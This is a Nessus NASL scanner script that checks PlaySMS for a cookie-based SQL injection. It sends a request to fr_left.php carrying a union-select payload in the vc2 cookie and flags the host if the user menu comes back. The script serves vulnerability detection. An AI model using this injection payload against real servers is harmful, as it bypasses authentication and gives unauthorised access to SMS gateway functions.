#
# This script was written by Noam Rathaus
#
# GPL
#
# Contact: Noam Rathaus <noamr@beyondsecurity.com>
# Subject: PlaySMS SQL Injection via Cookie
# Date: 	18.8.2004 15:03

if(description)
{
 script_id(14362);
 script_bugtraq_id(10751, 10752, 10970);
 script_version("$Revision: 1.2 $");
 script_name(english:"PlaySMS Cookie SQL Injection");
 
 
 desc["english"] = "
PlaySMS is a full-featured SMS gateway application that features sending of
single or broadcast SMSes, the ability to receive and forward SMSes, an SMS
board, an SMS polling system, SMS customs for handling incoming SMSes and
forwarding them to custom applications, and SMS commands for saving/retrieving
information to/from a server and executing server-side shell scripts.

An SQL Injection vulnerability in the product allows remote attackers to
inject arbitrary SQL statements via the cookie mechanism used by the product.

Solution : Upgrade to version 0.7.1.
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Tests for the PlaySMS SQL Injection";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# The script code starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 req = string("GET ", dir, "/fr_left.php HTTP/1.1\r\n",
              "Host: ", get_host_name(), ":", port, "\r\n",
              "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7) Gecko/20040712 Firefox/0.9.1\r\n",
              "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n",
              "Accept-Language: en-us,en;q=0.5\r\n",
              "Cookie: vc1=ticket; vc2='%20union%20select%20'ticket;\r\n",
              "Connection: close\r\n\r\n");

 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);

 if ( ("User's Menu" >< res) && ("Add SMS board" >< res))
 {
	security_hole(port);
	exit(0);
 }
}

